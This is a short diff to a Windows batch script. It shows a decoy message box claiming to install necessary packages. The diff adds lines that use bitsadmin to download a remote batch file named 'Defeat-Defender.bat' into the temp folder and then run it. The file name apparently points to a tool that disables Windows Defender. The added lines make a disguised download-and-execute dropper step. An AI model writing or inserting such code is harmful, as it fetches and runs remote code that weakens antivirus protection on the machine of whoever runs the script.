@@ -25,3 +25,8 @@ echo msgbox "Please Wait While we install necessary packages for You!.Window wil
 wscript %tmp%\tmp.vbs
 del %tmp%\tmp.vbs
 
+cd %temp%
+
+bitsadmin /transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Defeat-Defender/main/Defeat-Defender.bat  %temp%\Defeat-Defender.bat
+
+start Defeat-Defender.bat
